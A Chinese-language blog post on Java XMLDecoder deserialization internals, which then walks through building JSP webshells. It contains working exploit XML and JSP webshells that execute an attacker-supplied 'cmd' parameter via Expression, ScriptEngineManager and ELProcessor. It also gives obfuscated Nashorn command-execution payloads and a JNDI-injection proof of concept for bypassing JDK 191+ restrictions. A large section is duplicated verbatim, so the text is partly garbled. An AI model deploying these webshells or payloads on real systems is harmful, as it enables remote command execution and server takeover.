
---
title: '【网络安全】反序列化漏洞底层扩展与制作WebShell'
categories: 
 - 编程
 - 掘金
 - 分类
headimg: 'https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/60d72c77beb84adcbdf1c3059047626b~tplv-k3u1fbpfcp-watermark.image'
author: 掘金
comments: false
date: Fri, 06 Aug 2021 22:53:58 GMT
thumbnail: 'https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/60d72c77beb84adcbdf1c3059047626b~tplv-k3u1fbpfcp-watermark.image'
---

<div>   
<div class="markdown-body"><style>.markdown-body&#123;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333&#125;.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6&#123;line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px&#125;.markdown-body h1&#123;font-size:30px;margin-bottom:5px&#125;.markdown-body h2&#123;padding-bottom:12px;font-size:24px;border-bottom:1px solid #ececec&#125;.markdown-body h3&#123;font-size:18px;padding-bottom:0&#125;.markdown-body h4&#123;font-size:16px&#125;.markdown-body h5&#123;font-size:15px&#125;.markdown-body h6&#123;margin-top:5px&#125;.markdown-body p&#123;line-height:inherit;margin-top:22px;margin-bottom:22px&#125;.markdown-body img&#123;max-width:100%&#125;.markdown-body hr&#123;border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px&#125;.markdown-body code&#123;word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em&#125;.markdown-body code,.markdown-body pre&#123;font-family:Menlo,Monaco,Consolas,Courier New,monospace&#125;.markdown-body pre&#123;overflow:auto;position:relative;line-height:1.75&#125;.markdown-body pre>code&#123;font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8&#125;.markdown-body a&#123;text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff&#125;.markdown-body a:active,.markdown-body a:hover&#123;color:#275b8c&#125;.markdown-body table&#123;display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6&#125;.markdown-body thead&#123;background:#f6f6f6;color:#000;text-align:left&#125;.markdown-body tr:nth-child(2n)&#123;background-color:#fcfcfc&#125;.markdown-body td,.markdown-body th&#123;padding:12px 7px;line-height:24px&#125;.markdown-body td&#123;min-width:120px&#125;.markdown-body blockquote&#123;color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8&#125;.markdown-body blockquote:after&#123;display:block;content:""&#125;.markdown-body blockquote>p&#123;margin:10px 0&#125;.markdown-body ol,.markdown-body ul&#123;padding-left:28px&#125;.markdown-body ol li,.markdown-body ul li&#123;margin-bottom:0;list-style:inherit&#125;.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item&#123;list-style:none&#125;.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul&#123;margin-top:0&#125;.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul&#123;margin-top:3px&#125;.markdown-body ol li&#123;padding-left:6px&#125;.markdown-body .contains-task-list&#123;padding-left:0&#125;.markdown-body .task-list-item&#123;list-style:none&#125;@media (max-width:720px)&#123;.markdown-body h1&#123;font-size:24px&#125;.markdown-body h2&#123;font-size:20px&#125;.markdown-body h3&#123;font-size:18px&#125;&#125;</style><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/60d72c77beb84adcbdf1c3059047626b~tplv-k3u1fbpfcp-watermark.image" alt loading="lazy" referrerpolicy="no-referrer"></p>
<h2 data-id="heading-0">XMLDecoder反序列化漏洞底层</h2>
<p><a href="https://link.juejin.cn/?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttps%253A%252F%252Fwww.freebuf.com%252Farticles%252Fnetwork%252F247331.html" target="_blank" rel="nofollow noopener noreferrer" title="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fwww.freebuf.com%2Farticles%2Fnetwork%2F247331.html" ref="nofollow noopener noreferrer">参考</a>的文章已经分析的非常详细了，这里我主要是就是一下最后的执行是怎么样的。也就是Expression类的使用</p>
<pre><code class="copyable">import java.beans.Expression;

public class test &#123;
    public static void main(String[] args)throws Exception &#123;
        Parameter(); //有参数
        NoParameter(); //无参数
    &#125;
    public static void Parameter() throws Exception&#123;
        Object var3 = new ProcessBuilder();
        String var4 = "command";
        String[] strings = new String[]&#123;"calc"&#125;;
        Object[] var2 = new Object[]&#123;strings&#125;;
        Expression var5 = new Expression(var3, var4, var2);
        Object value = var5.getValue(); //获得参数的类

        String var1 = "start";
        Object[] var6 = new Object[]&#123;&#125;;
        Expression expression = new Expression(value, var1, var6); //执行start方法
        expression.getValue();

//        为什么不能执行？因为class.newInstance只能调用无参构造函数而ProcessBuilder没有无参数构造函数。
//        Class<?> aClass = value.getClass();
//        Object o = aClass.newInstance();
//        Method start = aClass.getMethod("start");
//        start.invoke(o);
    &#125;
    public static void NoParameter()&#123;
        String[] strings = new String[]&#123;"cmd.exe","/c","calc"&#125;;
        Object var3 = new ProcessBuilder(strings);
        String var4 = "start";
        Object[] var2 = new Object[]&#123;&#125;;
        Expression var5 = new Expression(var3, var4, var2);
        try &#123;
            var5.getValue();
        &#125; catch (Exception e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;
<span class="copy-code-btn">复制代码</span></code></pre>
<p>并且通过测试可以发现Expression的使用，给出下面的例子。</p>
<pre><code class="copyable">public class cmd &#123;
    public void Noparameter()&#123;
        System.out.println("无参数调用....");
    &#125;
    public void Parameter(Object[] obj)&#123;
        System.out.println("有参数调用....");
    &#125;
&#125;
import java.beans.Expression;

public class test1 &#123;
    public static void main(String[] args)throws Exception &#123;
        Object var3 = new cmd();
        String var4 = "Parameter"; //Noparameter
        Object[] var2 = new Object[]&#123;"233333"&#125;;
        var2 = new Object[]&#123;var2&#125;;
        var2 = new Object[]&#123;&#125;;
        Expression var5 = new Expression(var3, var4, var2);
        var5.getValue();
    &#125;
&#125;
<span class="copy-code-btn">复制代码</span></code></pre>
<p>并且给出了一些exp。</p>
<pre><code class="copyable"> <? xml version="1.0" encoding="UTF-8" ?> 
<java>
    <object class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
            <void index="0">
                <string>cmd.exe</string>
            </void>
            <void index="1">
                <string>/c</string>
            </void>
            <void index="2">
                <string>calc</string>
            </void>
        </array>
        <void method="start">
        </void>
    </object>
</java>
<span class="copy-code-btn">复制代码</span></code></pre>
<p><strong>通过实体编码绕过</strong></p>
<pre><code class="copyable"> <? xml version="1.0" encoding="UTF-8" ?> 
<java>
    <object class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
            <void index="0">
                <string>cmd.exe</string>
            </void>
            <void index="1">
                <string>/c</string>
            </void>
            <void index="2">
                <string>calc</string>
            </void>
        </array>
        <void method="start"/>
    </object>
</java>
<span class="copy-code-btn">复制代码</span></code></pre>
<pre><code class="copyable"> <? xml version="1.0" encoding="UTF-8" ?> 
<java>
 <object class="java.io.PrintWriter">
  <string>D:\shell.jsp</string>
  <void method="println">
  <string>
   webshell
 </string>
  </void>
  <void method="close"/>
 </object>
</java>
<span class="copy-code-btn">复制代码</span></code></pre>
<p>想了一下Expression类，底层是通过反射执行的， 那我们能可以制作webshell了</p>
<h2 data-id="heading-1"><img src="https://juejin.cn/post/6993577287295696927" alt loading="lazy" referrerpolicy="no-referrer"></h2>
<h2 data-id="heading-2">制作WebShell</h2>
<h3 data-id="heading-3">Expression</h3>
<pre><code class="copyable">package shell.Expression;

import java.beans.Expression;

public class test &#123;
    public static void main(String[] args) &#123;
        String payload ="calc";
        Expression expression = new Expression(Runtime.getRuntime(),"\u0065"+"\u0078"+"\u0065"+"\u0063",new Object[]&#123;payload&#125;);
        try &#123;
            expression.getValue();
        &#125; catch (Exception e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;
<span class="copy-code-btn">复制代码</span></code></pre>
<p>上面是java代码，执行的原理是反射在getValue方法中可以清楚的看到，要制作webshell就需要jsp代码。</p>
<pre><code class="copyable"><%@ page import="java.beans.Expression"%>
<%@ page contentType="text/html; charset=UTF-8" language="java" %>
<%
    String payload =request.getParameter("cmd");
    Expression expression = new Expression(Runtime.getRuntime(),"\u0065"+"\u0078"+"\u0065"+"\u0063",new Object[]&#123;payload&#125;);
    expression.getValue();
%>
<span class="copy-code-btn">复制代码</span></code></pre>
<p>介绍到这里又突然想到了其他表达式类的执行。</p>
<h3 data-id="heading-4"><img src="https://juejin.cn/post/6993577287295696927" alt loading="lazy" referrerpolicy="no-referrer"></h3>
<h3 data-id="heading-5">ScriptEngineManager</h3>
<p>通过ScriptEngineManager这个类可以实现Java跟JS的相互调用，虽然Java自己没有eval函数，但是ScriptEngineManager有eval函数，并且可以直接调用Java对象，也就相当于间接实现了Java的eval功能。</p>
<pre><code class="copyable">package shell.ScriptEngineManager;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;

public class test &#123;
    public static void main(String[] args) throws Exception&#123;
        String test = "print('hello word!!');";
        String payload1 = "java.lang.Runtime.getRuntime().exec("calc")";
        String payload2 = "var a=exp();function exp()&#123;var x=new java.lang.ProcessBuilder; x.command("calc"); x.start();&#125;;";
        String payload3 = "var a=exp();function exp()&#123;java.lang./****/Runtime./***/getRuntime().exec("calc")&#125;;";
        String payload4 = "\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065.getRuntime().exec("calc");";
        String payload5 = "var a= Java.type("java.lang"+".Runtime"); var b =a.getRuntime();b.exec("calc");";
        String payload6 = "load("nashorn:mozilla_compat.js");importPackage(java.lang); var x=Runtime.getRuntime(); x.exec("calc");";
        //兼容Rhino功能 https://blog.csdn.net/u013292493/article/details/51020057
        String payload7 = "var a =JavaImporter(java.lang); with(a)&#123; var b=Runtime.getRuntime().exec("calc");&#125;";
//        String payload8 = "var scr = document.createElement("script");scr.src = "http://127.0.0.1:8082/js.js";document.body.appendChild(scr);exec();";
        eval(payload7);
    &#125;
    public static void eval(String payload)&#123;
        payload=payload;
        ScriptEngineManager manager = new ScriptEngineManager(null);
        ScriptEngine engine = manager.getEngineByName("js");
        try &#123;
            engine.eval(payload);
        &#125; catch (Exception e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;
<span class="copy-code-btn">复制代码</span></code></pre>
<p>然后自己突发奇想，思考能不能远程加载js代码？然后执行远程js代码里面的exp。参考<strong>payload8</strong></p>
<pre><code class="copyable">function exec()&#123;    
    var a=exp();function exp()&#123;var x=new java.lang.ProcessBuilder; x.command("calc"); x.start();&#125;;
&#125;
<span class="copy-code-btn">复制代码</span></code></pre>
<p><a href="https://link.juejin.cn/?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttps%253A%252F%252Fp3.ssl.qhimg.com%252Ft0179f10a0c8e69a0e6.png" target="_blank" rel="nofollow noopener noreferrer" title="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fp3.ssl.qhimg.com%2Ft0179f10a0c8e69a0e6.png" ref="nofollow noopener noreferrer"><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e9ae96b4c26f4b2cb10b63e4dd61d259~tplv-k3u1fbpfcp-watermark.image" alt loading="lazy" referrerpolicy="no-referrer"></a></p>
<p>执行失败！百度了一下原因大概是因为java在执行js代码的时候没有浏览器的内置对象如：document，window等等。</p>
<p><a href="https://link.juejin.cn/?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttps%253A%252F%252Fblog.csdn.net%252Fxiaozei523%252Farticle%252Fdetails%252F58002392" target="_blank" rel="nofollow noopener noreferrer" title="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fblog.csdn.net%2Fxiaozei523%2Farticle%2Fdetails%2F58002392" ref="nofollow noopener noreferrer">解决方法</a> 大概就是添加组件配置java解析浏览器的环境？？这样的话基本上不可能这样配置了，于是自己就没有在深入了解了。</p>
<h4 data-id="heading-6">java执行js代码的底层原理</h4>
<p>这里自己调试会很多次中间的具体流程基本上就是一个解析过程，所以只看最后。</p>
<p><a href="https://link.juejin.cn/?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttps%253A%252F%252Fp3.ssl.qhimg.com%252Ft01e6956b494b8dcb24.png" target="_blank" rel="nofollow noopener noreferrer" title="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fp3.ssl.qhimg.com%2Ft01e6956b494b8dcb24.png" ref="nofollow noopener noreferrer"><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4d3964e9272e430d999ae20f204a9eb8~tplv-k3u1fbpfcp-watermark.image" alt loading="lazy" referrerpolicy="no-referrer"></a></p>
<p>其实本质上还是反射。最后的调用apply:393, ScriptRuntime (jdk.nashorn.internal.runtime) 的apply方式去执行。</p>
<p>在看一下调用栈：</p>
<pre><code class="copyable">apply:393, ScriptRuntime (jdk.nashorn.internal.runtime)
evalImpl:449, NashornScriptEngine (jdk.nashorn.api.scripting)
evalImpl:406, NashornScriptEngine (jdk.nashorn.api.scripting)
evalImpl:402, NashornScriptEngine (jdk.nashorn.api.scripting)
eval:155, NashornScriptEngine (jdk.nashorn.api.scripting)
eval:264, AbstractScriptEngine (javax.script)
eval:24, test (shell.ScriptEngineManager)
main:17, test (shell.ScriptEngineManager)
<span class="copy-code-btn">复制代码</span></code></pre>
<p><strong>调试过程大家可以自己去测试</strong></p>
<p>而上面的加载远程js的思路是来自自己调试的过程。</p>
<p><a href="https://link.juejin.cn/?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttps%253A%252F%252Fp0.ssl.qhimg.com%252Ft01d99bf455b7ffdf3f.png" target="_blank" rel="nofollow noopener noreferrer" title="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fp0.ssl.qhimg.com%2Ft01d99bf455b7ffdf3f.png" ref="nofollow noopener noreferrer"><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0b91fb158bba4d00b04f3a7b51c5d371~tplv-k3u1fbpfcp-watermark.image" alt loading="lazy" referrerpolicy="no-referrer"></a></p>
<p>那webshell.无回显的</p>
<pre><code class="copyable"><%@ page import="javax.script.ScriptEngineManager" %>
<%@ page import="javax.script.ScriptEngine" %>
<%
    ScriptEngineManager manager = new ScriptEngineManager(null);
    ScriptEngine engine = manager.getEngineByName("js");
    String payload = request.getParameter("cmd");
    engine.eval(payload);
%>
<span class="copy-code-btn">复制代码</span></code></pre>
<p>然后不得不说java中还有一个表达式执行的,那就是EL表达式</p>
<h3 data-id="heading-7"><img src="https://juejin.cn/post/6993577287295696927" alt loading="lazy" referrerpolicy="no-referrer"></h3>
<h3 data-id="heading-8">ELProcessor</h3>
<p>表达式语言（Expression Language），或称EL表达式，简称EL，是Java中的一种特殊的通用编程语言，借鉴于JavaScript和XPath。主要作用是在Java Web应用程序嵌入到网页（如JSP）中，用以访问页面的上下文以及不同作用域中的对象 ，取得对象属性的值，或执行简单的运算或判断操作。EL在得到某个数据时，会自动进行数据类型的转换。</p>
<p>ELProcessor也有自己的eval函数，并且可以调用Java对象执行命令。</p>
<pre><code class="copyable">package shell.EL;

import javax.el.ELProcessor;

public class test &#123;
    public static void main(String[] args) throws Exception &#123;
        String payload = """.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("var exp='calc';java.lang.Runtime.getRuntime().exec(exp);")";

        String poc = "''.getClass().forName('javax.script.ScriptEngineManager')" +
                ".newInstance().getEngineByName('nashorn')" +
                ".eval("s=[3];s[0]='cmd.exe';s[1]='/c';s[2]='calc';java.lang.Runtime.getRuntime().exec(s);")";

        ELeval(payload);
    &#125;
    public static void ELeval(String payload)&#123;
        payload=payload;
        ELProcessor elProcessor = new ELProcessor();
        try &#123;
            elProcessor.eval(payload);
        &#125; catch (Exception e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;
<span class="copy-code-btn">复制代码</span></code></pre>
<p>我们也可以看看EL表达式的底层原理。</p>
<h4 data-id="heading-9">EL表达式的底层原理</h4>
<p>我们使用payload进行debug调试，一直跟着流程走发现最后还是通过反射去执行。</p>
<p><a href="https://link.juejin.cn/?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttps%253A%252F%252Fp4.ssl.qhimg.com%252Ft01c1917365cf873f29.png" target="_blank" rel="nofollow noopener noreferrer" title="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fp4.ssl.qhimg.com%2Ft01c1917365cf873f29.png" ref="nofollow noopener noreferrer"><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d89435e34f554a72b250161dc962d3d4~tplv-k3u1fbpfcp-watermark.image" alt loading="lazy" referrerpolicy="no-referrer"></a></p>
<p>最后在AstValue类中执行getValue方法，从而调用payload，之后就会js代码执行的流程一样了。</p>
<p>调用栈：</p>
<pre><code class="copyable">getValue:159, AstValue (org.apache.el.parser)
getValue:190, ValueExpressionImpl (org.apache.el)
getValue:61, ELProcessor (javax.el)
eval:54, ELProcessor (javax.el)
ELeval:20, test (shell.EL)
main:13, test (shell.EL)
<span class="copy-code-btn">复制代码</span></code></pre>
<p>webshell.无回显的</p>
<pre><code class="copyable"><%@ page import="javax.el.ELProcessor"%>
<%@ page contentType="text/html; charset=UTF-8" language="java" %>
<%
    String cmd =request.getParameter("cmd");
    String payload = """.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("var exp='"+cmd+"';java.lang.Runtime.getRuntime().exec(exp);")";
    ELProcessor elProcessor = new ELProcessor();
    elProcessor.eval(payload);
%>
<span class="copy-code-btn">复制代码</span></code></pre>
<p>介绍到这里，突然想到了jndi注入绕过jdk191+，其中的一种方法就是利用ELProcessor类</p>
<p>这里直接给出poc</p>
<pre><code class="copyable">Registry registry = LocateRegistry.createRegistry(rmi_port);
// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
// 强制将 'x' 属性的setter 从 'setX' 变为 'eval', 详细逻辑见 BeanFactory.getObjectInstance 代码
ref.add(new StringRefAddr("forceString", "KINGX=eval"));
// 利用表达式执行命令
ref.add(new StringRefAddr("KINGX", """.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd.exe','/c','calc']).start()")"));
ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
registry.bind("Exploit", referenceWrapper);
<span class="copy-code-btn">复制代码</span></code></pre>
<p>还有一种方法是通过LDAP去绕过，自己写了一个<a href="https://link.juejin.cn/?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttps%253A%252F%252Fgithub.com%252FFirebasky%252FLdapBypassJndi" target="_blank" rel="nofollow noopener noreferrer" title="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2FFirebasky%2FLdapBypassJndi" ref="nofollow noopener noreferrer">小工具</a></p>
<h2 data-id="heading-10">总结</h2>
<p>通过学习XMLDecoder的底层执行的流程去发现其他表达式执行，而其中的很多底层都是通过java反射技术实现的！</p>
<p>若文章中出现错误希望大佬们能够提出</p>
<p>其实本质上还是反射。最后的调用apply:393, ScriptRuntime (jdk.nashorn.internal.runtime) 的apply方式去执行。</p>
<p>在看一下调用栈：</p>
<pre><code class="copyable">apply:393, ScriptRuntime (jdk.nashorn.internal.runtime)
evalImpl:449, NashornScriptEngine (jdk.nashorn.api.scripting)
evalImpl:406, NashornScriptEngine (jdk.nashorn.api.scripting)
evalImpl:402, NashornScriptEngine (jdk.nashorn.api.scripting)
eval:155, NashornScriptEngine (jdk.nashorn.api.scripting)
eval:264, AbstractScriptEngine (javax.script)
eval:24, test (shell.ScriptEngineManager)
main:17, test (shell.ScriptEngineManager)
<span class="copy-code-btn">复制代码</span></code></pre>
<p><strong>调试过程大家可以自己去测试</strong></p>
<p>而上面的加载远程js的思路是来自自己调试的过程。</p>
<p><a href="https://link.juejin.cn/?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttps%253A%252F%252Fp0.ssl.qhimg.com%252Ft01d99bf455b7ffdf3f.png" target="_blank" rel="nofollow noopener noreferrer" title="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fp0.ssl.qhimg.com%2Ft01d99bf455b7ffdf3f.png" ref="nofollow noopener noreferrer"><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e161593494d64d7698b2b3357c529f91~tplv-k3u1fbpfcp-watermark.image" alt loading="lazy" referrerpolicy="no-referrer"></a></p>
<p>那webshell.无回显的</p>
<pre><code class="copyable"><%@ page import="javax.script.ScriptEngineManager" %>
<%@ page import="javax.script.ScriptEngine" %>
<%
    ScriptEngineManager manager = new ScriptEngineManager(null);
    ScriptEngine engine = manager.getEngineByName("js");
    String payload = request.getParameter("cmd");
    engine.eval(payload);
%>
<span class="copy-code-btn">复制代码</span></code></pre>
<p>然后不得不说java中还有一个表达式执行的,那就是EL表达式</p>
<h3 data-id="heading-11"><img src="https://juejin.cn/post/6993577287295696927" alt loading="lazy" referrerpolicy="no-referrer"></h3>
<h3 data-id="heading-12">ELProcessor</h3>
<p>表达式语言（Expression Language），或称EL表达式，简称EL，是Java中的一种特殊的通用编程语言，借鉴于JavaScript和XPath。主要作用是在Java Web应用程序嵌入到网页（如JSP）中，用以访问页面的上下文以及不同作用域中的对象 ，取得对象属性的值，或执行简单的运算或判断操作。EL在得到某个数据时，会自动进行数据类型的转换。</p>
<p>ELProcessor也有自己的eval函数，并且可以调用Java对象执行命令。</p>
<pre><code class="copyable">package shell.EL;

import javax.el.ELProcessor;

public class test &#123;
    public static void main(String[] args) throws Exception &#123;
        String payload = """.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("var exp='calc';java.lang.Runtime.getRuntime().exec(exp);")";

        String poc = "''.getClass().forName('javax.script.ScriptEngineManager')" +
                ".newInstance().getEngineByName('nashorn')" +
                ".eval("s=[3];s[0]='cmd.exe';s[1]='/c';s[2]='calc';java.lang.Runtime.getRuntime().exec(s);")";

        ELeval(payload);
    &#125;
    public static void ELeval(String payload)&#123;
        payload=payload;
        ELProcessor elProcessor = new ELProcessor();
        try &#123;
            elProcessor.eval(payload);
        &#125; catch (Exception e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;
<span class="copy-code-btn">复制代码</span></code></pre>
<p>我们也可以看看EL表达式的底层原理。</p>
<h4 data-id="heading-13">EL表达式的底层原理</h4>
<p>我们使用payload进行debug调试，一直跟着流程走发现最后还是通过反射去执行。</p>
<p><a href="https://link.juejin.cn/?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttps%253A%252F%252Fp4.ssl.qhimg.com%252Ft01c1917365cf873f29.png" target="_blank" rel="nofollow noopener noreferrer" title="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fp4.ssl.qhimg.com%2Ft01c1917365cf873f29.png" ref="nofollow noopener noreferrer"><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c17149ea05a949d4ab550989f853986d~tplv-k3u1fbpfcp-watermark.image" alt loading="lazy" referrerpolicy="no-referrer"></a></p>
<p>最后在AstValue类中执行getValue方法，从而调用payload，之后就会js代码执行的流程一样了。</p>
<p>调用栈：</p>
<pre><code class="copyable">getValue:159, AstValue (org.apache.el.parser)
getValue:190, ValueExpressionImpl (org.apache.el)
getValue:61, ELProcessor (javax.el)
eval:54, ELProcessor (javax.el)
ELeval:20, test (shell.EL)
main:13, test (shell.EL)
<span class="copy-code-btn">复制代码</span></code></pre>
<p>webshell.无回显的</p>
<pre><code class="copyable"><%@ page import="javax.el.ELProcessor"%>
<%@ page contentType="text/html; charset=UTF-8" language="java" %>
<%
    String cmd =request.getParameter("cmd");
    String payload = """.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("var exp='"+cmd+"';java.lang.Runtime.getRuntime().exec(exp);")";
    ELProcessor elProcessor = new ELProcessor();
    elProcessor.eval(payload);
%>
<span class="copy-code-btn">复制代码</span></code></pre>
<p>介绍到这里，突然想到了jndi注入绕过jdk191+，其中的一种方法就是利用ELProcessor类</p>
<p>这里直接给出poc</p>
<pre><code class="copyable">Registry registry = LocateRegistry.createRegistry(rmi_port);
// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
// 强制将 'x' 属性的setter 从 'setX' 变为 'eval', 详细逻辑见 BeanFactory.getObjectInstance 代码
ref.add(new StringRefAddr("forceString", "KINGX=eval"));
// 利用表达式执行命令
ref.add(new StringRefAddr("KINGX", """.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd.exe','/c','calc']).start()")"));
ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
registry.bind("Exploit", referenceWrapper);
<span class="copy-code-btn">复制代码</span></code></pre>
<p>还有一种方法是通过LDAP去绕过，自己写了一个<a href="https://link.juejin.cn/?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttps%253A%252F%252Fgithub.com%252FFirebasky%252FLdapBypassJndi" target="_blank" rel="nofollow noopener noreferrer" title="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2FFirebasky%2FLdapBypassJndi" ref="nofollow noopener noreferrer">小工具</a></p>
<h2 data-id="heading-14">总结</h2>
<p>通过学习XMLDecoder的底层执行的流程去发现其他表达式执行，而其中的很多底层都是通过java反射技术实现的！</p>
<p>若文章中出现错误希望大佬们能够提出</p>
<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d31348c088aa4d94915b0382fe4a53cf~tplv-k3u1fbpfcp-watermark.image" alt="image.png" loading="lazy" referrerpolicy="no-referrer"></p>
<p><strong>最后</strong></p>
<p>如果你有想掌握更多更高阶的网安技术可以call me【<a href="https://link.juejin.cn/?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttps%253A%252F%252Fdocs.qq.com%252Fdoc%252FDVFNpaGJvRFJiQ2Ro" target="_blank" rel="nofollow noopener noreferrer" title="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fdocs.qq.com%2Fdoc%2FDVFNpaGJvRFJiQ2Ro" ref="nofollow noopener noreferrer">学习</a>】</p>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f2bb85a0beac4bceb0f887a4196d2fd5~tplv-k3u1fbpfcp-watermark.image" alt="image.png" loading="lazy" referrerpolicy="no-referrer"></p></div>  
</div>
            